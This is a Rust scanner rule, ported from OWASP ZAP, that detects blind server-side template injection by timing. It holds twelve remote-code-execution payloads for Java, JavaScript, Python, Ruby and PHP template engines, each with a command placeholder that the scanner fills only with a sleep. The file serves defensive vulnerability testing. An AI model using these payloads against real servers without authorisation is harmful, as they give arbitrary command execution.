//! Ported from ZAP SstiBlindScanRule (ascanrules, Apache License 2.0).
//!
//! Only the time based checks are ported; ZAP's out-of-band variant (payloads
//! running `curl`/`wget` against an OAST callback at HIGH/INSANE strength) needs
//! a callback service and is omitted.

use super::common::point;
use super::timing::{check_timing, fractional_seconds, sleep_seconds, TimingOutcome};
use crate::scan::active::{ActiveRule, BoxFuture, Cx, RuleScope};
use crate::scan::{AlertDef, Confidence, Risk};

static ALERT: AlertDef = AlertDef {
    alert_ref: "90036",
    name: "Server Side Template Injection (Blind)",
    risk: Risk::High,
    confidence: Confidence::High,
    cwe: 1336,
    wasc: 20,
    description: "When the user input is inserted in the template instead of being used as argument in rendering is \
        evaluated by the template engine. Depending on the template engine it can lead to remote code execution.",
    solution: "Instead of inserting the user input in the template, use it as rendering argument.",
    references: &["https://portswigger.net/research/server-side-template-injection"],
    tags: &["OWASP_2025_A05", "OWASP_2021_A03", "OWASP_2017_A01", "WSTG-v42-INPV-18", "API_2023_API10", "TEST_TIMING"],
};

static ALERTS: [&AlertDef; 1] = [&ALERT];

const SECONDS_PLACEHOLDER: &str = "X_SECONDS_X";

// Most of the exploits were created by James Kettle (@albinowax) and the Tplmap author.
const JAVA_PAYLOADS: &[&str] = &[
    // Freemarker
    r#"<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("X_COMMAND_X") }"#,
    // Velocity
    "#set($engine=\"\")\n\
     #set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime().exec(\"X_COMMAND_X\"))\n\
     #set($null=$proc.waitFor())\n\
     ${null}",
];

const JAVASCRIPT_PAYLOADS: &[&str] = &[
    // doT
    "{{= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString() }}",
    // EJS
    "<%= global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()%>",
    // Jade
    "#{global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()}",
    // Nunjucks
    r#"{{range.constructor("return eval(\"global.process.mainModule.require('child_process').execSync('X_COMMAND_X').toString()\")")()}}"#,
];

const PYTHON_PAYLOADS: &[&str] = &[
    // Jinja2 (python3, possibly doesn't work)
    r#"{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("X_COMMAND_X")}}"#,
    // Mako
    r#"${__import__("subprocess").check_output("X_COMMAND_X", shell=True)}"#,
    // Tornado
    r#"{{__import__("subprocess").check_output("X_COMMAND_X", shell=True)}}"#,
];

const RUBY_PAYLOADS: &[&str] = &[
    // ERB
    "<%=%x(X_COMMAND_X)%>",
    // Slim
    "#{%x(X_COMMAND_X)}",
];

const PHP_PAYLOADS: &[&str] = &[
    // Smarty
    r#"{system("X_COMMAND_X")}"#,
];

/// In ZAP's order of technologies: Java, JavaScript, Python, Ruby, PHP.
const LANGUAGES: [&[&str]; 5] = [JAVA_PAYLOADS, JAVASCRIPT_PAYLOADS, PYTHON_PAYLOADS, RUBY_PAYLOADS, PHP_PAYLOADS];

fn payload_format(command_exec: &str) -> String {
    command_exec.replace("X_COMMAND_X", "sleep X_SECONDS_X")
}

/// `(int) x` seconds in the sleep command.
fn payload_for(format: &str, delay: f64) -> String {
    format.replace(SECONDS_PLACEHOLDER, &(delay as i64).to_string())
}

pub struct SstiBlind;

impl ActiveRule for SstiBlind {
    fn id(&self) -> u32 {
        90036
    }

    fn name(&self) -> &'static str {
        "Server Side Template Injection (Blind)"
    }

    fn alerts(&self) -> &'static [&'static AlertDef] {
        &ALERTS
    }

    fn scope(&self) -> RuleScope {
        RuleScope::Param
    }

    fn scan<'a>(&'a self, cx: &'a Cx) -> BoxFuture<'a> {
        Box::pin(async move {
            // As in ZAP, a finding ends the payloads of its language only; the other
            // languages are still tried. Attack strength only drives the omitted OAST part.
            for payloads in LANGUAGES {
                time_based_tests(cx, payloads).await;
            }
        })
    }
}

async fn time_based_tests(cx: &Cx, payloads: &[&str]) {
    let (param, _) = point(cx);
    let sleep = sleep_seconds();
    for p in payloads {
        if cx.stopped() {
            return;
        }
        let format = payload_format(p);
        // Fractional seconds here (ZAP: getTimeElapsedMillis() / 1000.0).
        if let TimingOutcome::Injectable(t) =
            check_timing(cx, sleep, |x| payload_for(&format, x), fractional_seconds).await
        {
            let finding = ALERT.raise(param, "").attack(t.first_payload.clone());
            cx.report(finding, &t.first);
            return;
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn payloads() {
        assert_eq!(payload_for(&payload_format(RUBY_PAYLOADS[1]), 2.0), "#{%x(sleep 2)}");
        assert_eq!(
            payload_for(&payload_format(JAVA_PAYLOADS[1]), 5.0),
            "#set($engine=\"\")\n#set($proc=$engine.getClass().forName(\"java.lang.Runtime\").getRuntime()\
             .exec(\"sleep 5\"))\n#set($null=$proc.waitFor())\n${null}"
        );
        assert!(JAVASCRIPT_PAYLOADS[3].contains(r#"eval(\"global.process"#));
        assert_eq!(payload_for(&payload_format(PHP_PAYLOADS[0]), 1.0), "{system(\"sleep 1\")}");
        assert_eq!(LANGUAGES.iter().map(|l| l.len()).sum::<usize>(), 12);
    }
}
